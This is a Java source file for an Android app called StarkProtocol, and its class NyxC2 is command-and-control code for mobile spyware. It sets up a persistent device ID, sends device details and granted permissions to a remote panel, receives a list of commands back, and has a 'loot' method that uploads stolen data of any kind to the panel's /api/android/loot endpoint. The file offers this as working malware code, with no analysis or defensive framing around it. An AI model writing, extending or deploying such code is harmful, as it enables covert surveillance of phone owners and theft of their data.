package com.stark.protocol;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

/** Beacon to Nyx panel Android tab. Does not touch Stark's own server.js features. */
public class NyxC2 {
    public static final String BASE = "https://nyxpanel.up.railway.app";
    private static final String TAG = "StarkNyx";

    public static String aid(Context ctx) {
        SharedPreferences sp = ctx.getSharedPreferences("stark_nyx", Context.MODE_PRIVATE);
        String id = sp.getString("aid", null);
        if (id == null || id.length() < 8) {
            String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            id = (androidId != null && androidId.length() > 6)
                    ? ("s" + androidId)
                    : ("s" + UUID.randomUUID().toString().replace("-", "").substring(0, 16));
            sp.edit().putString("aid", id).apply();
        }
        return id;
    }

    public static JSONArray hello(Context ctx, JSONObject perms) {
        try {
            JSONObject body = new JSONObject();
            body.put("aid", aid(ctx));
            body.put("model", Build.MODEL);
            body.put("manufacturer", Build.MANUFACTURER);
            body.put("android_ver", Build.VERSION.RELEASE);
            body.put("sdk", String.valueOf(Build.VERSION.SDK_INT));
            body.put("app", "StarkProtocol");
            body.put("app_ver", "1.0.0");
            body.put("lang", ctx.getResources().getConfiguration().locale.toLanguageTag());
            body.put("tz", java.util.TimeZone.getDefault().getID());
            if (perms != null) body.put("perms", perms);
            String raw = post(BASE + "/api/android/hello", body);
            if (raw == null || raw.isEmpty()) return new JSONArray();
            JSONObject o = new JSONObject(raw);
            JSONArray cmds = o.optJSONArray("cmds");
            return cmds != null ? cmds : new JSONArray();
        } catch (Exception e) {
            Log.w(TAG, "hello", e);
            return new JSONArray();
        }
    }

    public static void loot(Context ctx, String type, Object data) {
        try {
            JSONObject body = new JSONObject();
            body.put("aid", aid(ctx));
            body.put("type", type);
            body.put("data", data);
            post(BASE + "/api/android/loot", body);
        } catch (Exception e) {
            Log.w(TAG, "loot " + type, e);
        }
    }

    private static String post(String url, JSONObject body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(15000);
        c.setReadTimeout(20000);
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
        byte[] bytes = body.toString().getBytes("UTF-8");
        c.setFixedLengthStreamingMode(bytes.length);
        OutputStream os = c.getOutputStream();
        os.write(bytes);
        os.flush();
        os.close();
        int code = c.getResponseCode();
        BufferedReader br = new BufferedReader(new InputStreamReader(
                code >= 200 && code < 300 ? c.getInputStream() : c.getErrorStream(), "UTF-8"));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line);
        br.close();
        c.disconnect();
        return sb.toString();
    }
}
